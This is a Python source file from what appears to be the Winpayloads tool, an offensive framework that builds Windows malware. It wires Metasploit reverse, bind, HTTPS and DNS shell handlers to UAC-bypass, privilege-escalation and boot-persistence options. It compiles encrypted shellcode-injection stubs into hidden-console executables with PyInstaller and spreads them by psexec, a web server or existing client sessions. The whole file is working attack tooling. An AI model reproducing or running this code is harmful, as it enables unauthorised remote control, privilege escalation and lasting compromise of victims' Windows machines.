from main import *
from payloadextras import *
from psexecspray import *
from startmetasploit import *
from generatepayload import *
from menu import *
from encrypt import *
from sockets import *

payloaddir = '/etc/winpayloads'


METASPLOIT_Functions = {
    'reverse': {
        'uacbypass': METASPLOIT().metrev_uac,
        'allchecks': METASPLOIT().metrev_allchecks,
        'persistence': METASPLOIT().metrev_persistence,
        'normal': METASPLOIT().metrev_normal
    },
    'bind': {
        'uacbypass': METASPLOIT().metbind_uac,
        'allchecks': METASPLOIT().metbind_allchecks,
        'persistence': METASPLOIT().metbind_persistence,
        'normal': METASPLOIT().metbind_normal
    },
    'https': {
        'uacbypass': METASPLOIT().methttps_uac,
        'allchecks': METASPLOIT().methttps_allchecks,
        'persistence': METASPLOIT().methttps_persistence,
        'normal': METASPLOIT().methttps_normal
    },
    'dns': {
        'uacbypass': METASPLOIT().metdns_uac,
        'allchecks': METASPLOIT().metdns_allchecks,
        'persistence': METASPLOIT().metdns_persistence,
        'normal': METASPLOIT().metdns_normal
    },
    'nclistener': {
        'nclisten': METASPLOIT().nclisterner,
    }
}
def askAndReturnModules(shellcode, metasploit_type):
    if metasploit_type == 'nclistener':
        return (EXTRAS(shellcode).RETURN_EZ2READ_SHELLCODE(), METASPLOIT_Functions[metasploit_type]['nclisten'])
    else:
        want_UACBYPASS = raw_input(t.bold_red + '[*] Try UAC Bypass(Only Works For Local Admin Account)? y/[n]:' + t.normal)
        if want_UACBYPASS.lower() == 'y':
            return (EXTRAS(shellcode).UACBYPASS(), METASPLOIT_Functions[metasploit_type]['uacbypass'])

        want_ALLCHECKS = raw_input(t.bold_red + '[*] Invoke Priv Esc Checks? y/[n]:' + t.normal)
        if want_ALLCHECKS.lower() == 'y':
            return (EXTRAS(shellcode).ALLCHECKS(), METASPLOIT_Functions[metasploit_type]['allchecks'])

        want_PERSISTENCE = raw_input(t.bold_red + '[*] Persistent Payload on Boot? y/[n]:' + t.normal)
        if want_PERSISTENCE.lower() == 'y':
            return (EXTRAS(shellcode).PERSISTENCE(), METASPLOIT_Functions[metasploit_type]['persistence'])

        return (EXTRAS(shellcode).RETURN_EZ2READ_SHELLCODE(), METASPLOIT_Functions[metasploit_type]['normal'])

def GeneratePayload(ez2read_shellcode,payloadname,shellcode):
    with open('%s/payload.py' % payloaddir, 'w+') as Filesave:
        Filesave.write(do_Encryption(SHELLCODE.injectwindows % (ez2read_shellcode)))
        Filesave.close()
    print '[*] Creating Payload using Pyinstaller...'

    randomenckey = ''.join(random.sample(string.ascii_lowercase, 16))
    p = subprocess.Popen(['wine', '/root/.wine/drive_c/Python27/python.exe', '/opt/pyinstaller/pyinstaller.py',
                          '%s/payload.py' % payloaddir, '--noconsole', '--onefile', '--key',randomenckey], bufsize=1024, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    LOADING = Spinner('Generating Payload')
    while p.poll() == None:
        LOADING.Update()
        time.sleep(0.2)
    print '\r',
    sys.stdout.flush()

    payloadstderr = p.stderr.read()
    if re.search('error', payloadstderr.lower()):
        print t.bold_red + '[*] Error In Creating Payload... Exiting..\n' + t.normal
        sys.stdout.write(payloadstderr)
        raise KeyboardInterrupt
    os.system('mv dist/payload.exe %s/%s.exe'% (payloaddir,payloadname))
    print t.normal + '\n[*] Payload.exe Has Been Generated And Is Located Here: ' + t.bold_green + '%s/%s.exe' % (payloaddir, payloadname) + t.normal
    CleanUpPayloadMess(payloadname)
    from menu import clientMenuOptions
    if len(clientMenuOptions.keys()) > 2:
        DoClientUpload(payloaddir,payloadname,powershellExec=ez2read_shellcode,isExe=True)
    else:
        DoPayloadUpload(payloadname)


def CleanUpPayloadMess(payloadname):
    os.system('rm dist -r')
    os.system('rm build -r')
    os.system('rm *.spec')
    os.system('rm %s/payload.py' % payloaddir)

def DoPayloadUpload(payloadname):
    want_to_upload = raw_input(
        '\n[*] Upload To Local Websever or (p)sexec? [y]/p/n: ')
    if want_to_upload.lower() == 'p' or want_to_upload.lower() == 'psexec':
        DoPsexecSpray(payloaddir + '/' + payloadname + '.exe')
    elif want_to_upload.lower() == 'y' or want_to_upload.lower() == '':
        FUNCTIONS().DoServe(FUNCTIONS().CheckInternet(), payloadname, payloaddir, port=8000, printIt = True)

def DoClientUpload(payloaddir,payloadname,powershellExec,isExe):
    use_client_upload = raw_input(
        '\n[*] Upload Using Client Connection? [y]/n: ')
    if use_client_upload.lower() == 'y' or use_client_upload == '':
        from menu import clientMenuOptions
        for i in clientMenuOptions.keys():
            if i == 'back' or i == 'r':
                pass
            else:
                print t.bold_yellow + i +t.normal + ': ' + t.bold_green + clientMenuOptions[i]['payload']  + t.normal + '\n'
        while True:
            clientchoice = raw_input('>> ')
            try:
                clientconn, clientnumber = clientMenuOptions[clientchoice]['params']
                break
            except:
                continue

        clientUpload((payloaddir + '/' + payloadname),clientconn,powershellExec,isExe)
